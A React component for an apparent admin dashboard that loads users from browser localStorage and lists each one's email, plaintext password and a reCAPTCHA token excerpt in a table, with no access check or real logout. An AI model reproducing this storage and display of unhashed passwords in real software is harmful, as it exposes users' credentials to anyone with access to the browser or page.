import { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import './Dashboard.css'

function Dashboard() {
  const [users, setUsers] = useState([])
  const navigate = useNavigate()

  useEffect(() => {
    // Load users from localStorage
    const storedUsers = JSON.parse(localStorage.getItem('users') || '[]')
    setUsers(storedUsers)
  }, [])

  const handleLogout = () => {
    navigate('/')
  }

  return (
    <div className="dashboard-container">
      <div className="sidebar">
        <div className="sidebar-header">
          <h2>Dashboard</h2>
        </div>
        <nav className="sidebar-nav">
          <div className="nav-item active">
            <span>📊</span>
            <span>Users</span>
          </div>
          <div className="nav-item">
            <span>⚙️</span>
            <span>Settings</span>
          </div>
          <div className="nav-item">
            <span>📈</span>
            <span>Analytics</span>
          </div>
        </nav>
        <div className="sidebar-footer">
          <button onClick={handleLogout} className="logout-button">
            <span>🚪</span>
            <span>Logout</span>
          </button>
        </div>
      </div>

      <div className="dashboard-main">
        <header className="dashboard-header">
          <div className="header-content">
            <h1>User Management</h1>
            <div className="header-actions">
              <div className="user-badge">
                <span>👤</span>
                <span>Admin</span>
              </div>
            </div>
          </div>
        </header>

        <main className="dashboard-content">
          <div className="content-card">
            <div className="table-header">
              <h2>Registered Users</h2>
              <div className="table-stats">
                <span>Total: {users.length} users</span>
              </div>
            </div>

            {users.length === 0 ? (
              <div className="empty-state">
                <p>No users found. Sign in to add users to the dashboard.</p>
              </div>
            ) : (
              <div className="table-wrapper">
                <table className="users-table">
                  <thead>
                    <tr>
                      <th>#</th>
                      <th>Email</th>
                      <th>Password</th>
                      <th>reCAPTCHA Token</th>
                      <th>Timestamp</th>
                    </tr>
                  </thead>
                  <tbody>
                    {users.map((user, index) => (
                      <tr key={index}>
                        <td>{index + 1}</td>
                        <td className="email-cell">{user.email}</td>
                        <td className="password-cell">{user.password}</td>
                        <td className="token-cell">
                          <span className="token-preview">
                            {user.recaptchaToken
                              ? `${user.recaptchaToken.substring(0, 20)}...`
                              : 'N/A'}
                          </span>
                        </td>
                        <td className="timestamp-cell">
                          {new Date(user.timestamp).toLocaleString()}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </main>
      </div>
    </div>
  )
}

export default Dashboard

